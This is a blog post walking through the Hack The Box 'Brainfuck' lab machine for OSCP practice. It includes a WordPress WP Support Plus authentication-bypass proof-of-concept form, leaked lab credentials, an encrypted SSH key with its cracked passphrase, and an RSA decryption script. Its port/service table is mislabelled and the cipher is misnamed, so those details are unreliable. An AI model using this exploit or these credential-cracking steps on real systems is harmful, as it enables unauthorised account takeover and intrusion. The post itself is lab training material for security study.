---
layout: post
title: "HTB{Brainfuck}"
categories: jekyll
permalink : notes/htb4oscp/linux/brainfuck
---

## Box introduction

![bfinfo](/musubi/assets/htboscp/linux/brainfuck/brainfuck.png)

## Requirements
> Basic Linux command

> Basic Python

> WordPress Framework

> Basic Cryptography

## Enumeration

First, by running nmap scan, we will find the version of the services on the common ports that are open.

![brainfuck](/musubi/assets/htboscp/linux/brainfuck/nmap.png)

So, there are 5 open ports which are;

`Ports:Service`

` 22:ftp `

` 25:ssh `

` 110:smb`

` 143:smb`

` 443:ssl/http`

It seems that the web port of the target is open, and we will focus on web based attacks first if possible.

### Enumerating HTTPS/SSL
When we browse to the web page at `https://10.10.10.17` , we have been prompted by a certificate error.

![brainfuck](/musubi/assets/htboscp/linux/brainfuck/certificate_error.png)

In the error information, we found another domain names which are `www.brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb`.
So, we can add these domain names to our `\etc\hosts` file, simply add

`10.10.10.17 www.brainfuck.htb  sup3rs3cr3t.brainfuck.htb`.

Then, accept the certificate. After that, we can browse through these sites.

### Enumerating WordPress (www.brainfuck.htb)

We are then prompted to a WordPress webpage. A quick glance already give us possible credentials.

![brainfuck](/musubi/assets/htboscp/linux/brainfuck/wp.png)

`orestis@brainfuck.htb`

We first will use `wpscan` on the site to find any known vulnerabilities. Type,

` wpscan --url https://brainfuck.htb/ --disable-tls-checks ` .

After, we found out there are lots of vulnerabilities in the site. So, where should we start? Okay, here's one trick that can be used(not guaranteed 100%). We will choose the vulnerabilities that only have been documented by `exploitdb` . Using this way, we also can read exploits from `searchsploit` and just maybe, we might get the exploit working.

![wpsupportplus](/musubi/assets/htboscp/linux/brainfuck/wp_support_plus.png)

So, we found there is a WP Support Plus vulnerabilities that has `exploitdb` documentation. So, we can type `searchsploit WP Support Plus` and read the exploits/reports.

![wpsearchsploit](/musubi/assets/htboscp/linux/brainfuck/wpsearchsploit.png)

Okay, we got three exploits. But, we will discard the first one as it's version is older than what we currently dealing with.

![wpversion](/musubi/assets/htboscp/linux/brainfuck/wpversion.png)

### Exploitation

Let's read the first exploits. ( `cat /usr/share/exploitdb/exploits/php/webapps/41006.txt` )

![41006](/musubi/assets/htboscp/linux/brainfuck/41006.png)

It seems that we can exploit the usage of `wp_set_auth_cookie()` and login as anyone. We also got the Proof Of Concept. Let's try this one. But first, we need to get users information. So, we will run `wpscan --url https://brainfuck.htb/ --disable-tls-checks --enumerate u` .

![users](/musubi/assets/htboscp/linux/brainfuck/users.png)

Using the information above, we can guess that `orestis` might be an `admin` .

We then copy the POC then put it in an empty html file. Edit the url and add other information and we will have something like this.

{% highlight html %}
<form method="post" action="https://www.brainfuck.htb/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="admin">
	<input type="hidden" name="email" value="orestis@brainfuck.htb">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>
{% endhighlight %}

So, we are currently trying to get `admin` access on the WordPress page. Load up our simple python server by executing

` python -m SimpleHTTPServer `

Go to `localhost:8000/[yourfilename].html` we will be prompted with this page.

![poc](/musubi/assets/htboscp/linux/brainfuck/poc.png)

Click login and wait until the page finishes loading. Go back to our WP page and click the refresh button.

![admin](/musubi/assets/htboscp/linux/brainfuck/admin.png)

Boom! We are logged in as `admin`. At first glance, we can try to create a reverse php shell that will connect back to our netcat listener. We can go to `theme-editor.php` and we can add our shellcode there. But the problem here is we don't have a writable permission to edit the php files. So we will use other way to get in.

![notwritable](/musubi/assets/htboscp/linux/brainfuck/notwritable.png)

Now, the first post that we saw in the WP front page earlier will give us a hint about SMTP. So, we can go to `Settings -> Easy WP SMTP Settings`.
We found that there is a password for `orestis` . We can simply reveal the hidden pass by inspecting the page.

![inspect](/musubi/assets/htboscp/linux/brainfuck/inspect.png)
![value](/musubi/assets/htboscp/linux/brainfuck/value.png)

Now, we have an SMTP credential

`orestis@brainfuck.htb:kHGuERB29DNiNE`

Based on our nmap scan earlier, we know that SMTP port is open. So, we can use `evolution` in Kali to log in the SMTP service as `orestis`.
In `evolution`, go to `File->New->Mail Account`. And follow these steps in the images below to completely set up the mail.

![mail1](/musubi/assets/htboscp/linux/brainfuck/mail1.png)
![mail2](/musubi/assets/htboscp/linux/brainfuck/mail2.png)
![mail3](/musubi/assets/htboscp/linux/brainfuck/mail3.png)
![mail4](/musubi/assets/htboscp/linux/brainfuck/mail4.png)
![mail5](/musubi/assets/htboscp/linux/brainfuck/mail5.png)
![mail6](/musubi/assets/htboscp/linux/brainfuck/mail6.png)
![mail7](/musubi/assets/htboscp/linux/brainfuck/mail7.png)
![mail8](/musubi/assets/htboscp/linux/brainfuck/mail8.png)


Then we will find out that there are two messages in the inbox. The second one will show us another `orestis` credential.

![mailfromroot](/musubi/assets/htboscp/linux/brainfuck/mailfromroot.png)


`orestis:kIEnnfEKJ#9UmdO`

And as we know there is a "secret forum" at `sup3rs3cr3t.brainfuck.htb` , we will use that credential to log in and try to find something there.

### Enumerating Secret Forum (sup3rs3cr3t.brainfuck.htb)

Once we logged in, we found three forum threads, `Key, SSH Access , Development`. Going through all three of them, we only know that the forum `Key` is encrypted by some sort of encryption.

### Decrypting ciphertext

By analysing the ciphertext, we got some useful information.

Ciphertext :

`Pieagnm - Jkoijeg nbw zwx mle grwsnn`

`Wejmvse - Fbtkqal zqb rso rnl cwihsf`

`Qbqquzs - Pnhekxs dpi fca fhf zdmgzt`

Clear text :

`Orestis - Hacking for fun and profit`


So, starting from the first letter `O` we can see there is three possible letters for the clear text. This encryption is same as `enigma` machine. 

### Cracking the Enigma
The enigma can be attacked using known plain text. In this case, we will use one time pad cracking because we know the ciphertext and the plaintext. There is a site that can be used to [unpad](http://rumkin.com/tools/cipher/otp.php) it.

So we got a key for the ciphertext which is, `brainfuckmy`.

Using the key, we can get the clear text of other cipher text using keyed Vigenere or also known as [Quagmire III](http://rumkin.com/tools/cipher/vigenere-keyed.php).

![brainfuck](/musubi/assets/htboscp/linux/brainfuck/brainfuckmybrain.png)

Upon playing with the key, we found out that the real key is `fuckmybrain` and we will get a clear text for all of the ciphertext. We will get a link that leads to ssh key for `Orestis`.

![link](/musubi/assets/htboscp/linux/brainfuck/fuckmybrain.png)

### Enumerating SSH

As we can see, the ssh key for orestis is encrypted.

{% highlight bash %}
root@kali:/tmp/brainfuck# cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382

mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
-----END RSA PRIVATE KEY-----
{% endhighlight %}

So we need to crack it using `john`. We will use `sshng2john` from this [site](https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/sshng2john.py) first to convert it into `john` format, then we can crack it using `john` using the following commands.

![sshng2john](/musubi/assets/htboscp/linux/brainfuck/sshng2john.png)


and run `john` ,

![crackedjohn](/musubi/assets/htboscp/linux/brainfuck/poulakia.png)

boom! We got the passphrase for the ssh key.

`passphrase:3poulakia!`

We can then log in to orestis ssh using `ssh -i id_rsa orestis@10.10.10.17` .

But first, change the permission for `id_rsa` file or you'll get an error.

`chmod 600 id_rsa `.

Then you can log in and use the cracked passphrase that we got earlier.

![sshsession](/musubi/assets/htboscp/linux/brainfuck/sshsession.png)


## Post exploitation

We found out that there are interesting files in `orestis` home directory.

`debug.txt` : random numbers (what does the numbers for each line represent)

`encryption.sage` : encryption script (p? q? e? p*q? (p-1)`*`(q-1))

`output.txt` : the output result (root.txt)

This type of encryption is called RSA encryption. You can find more information on [wiki](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) , particularly at the `Key generation` part.

So, it is possible to attack the RSA encryption when we know the `p`, `q` , `e` and the `ciphertext`. Doing a quick search on Google will lead us to this [forum](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) where there is a decryption code given.

So, we will use it, and try if it's working. Well, if it's not working, guess we will have to crack it manually. :3

We will have something like this in our decryption script which we will call `decrypt.py` .

{% highlight python %}
def egcd(a, b):
  x,y, u,v = 0,1, 1,0
  while a != 0:
      q, r = b//a, b%a
      m, n = x-u*q, y-v*q
      b,a, x,y, u,v = a,r, u,v, m,n
      gcd = b
  return gcd, x, y

def main():

  p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
  q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
  e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
  ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182

  # compute n
  n = p * q

  # Compute phi(n)
  phi = (p - 1) * (q - 1)

  # Compute modular inverse of e
  gcd, a, b = egcd(e, phi)
  d = a

  print( "n:  " + str(d) );

  # Decrypt ciphertext
  pt = pow(ct, d, n)
  print( "pt: " + str(pt) )

if __name__ == "__main__":
  main()

{% endhighlight %}

So we will get this output :

{% highlight text %}

n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750

{% endhighlight %}

We got a plain text but it is in integers. So we need to convert it into readable ascii. By passing it to hex and convert the hex to string, we will create a simple python script to automate it.

{% highlight python %}

root@kali:/tmp/brainfuck# cat gettext.py

pt = 24604052029401386049980296953784287079059245867880966944246662849341507003750
print(str(hex(pt)[2:-1]).decode('hex'))

{% endhighlight %}

And when we run the script, we will get a plain text which is the hash for root.

## Knowledge gained
> Exploiting WP using vulnerable plugins

> Cracking the Enigma using known plaintext attack

> Decrypt RSA given p q e and ciphertext

And, thank you for today. Hope you learned a lot from this writeup. Until next time. :D
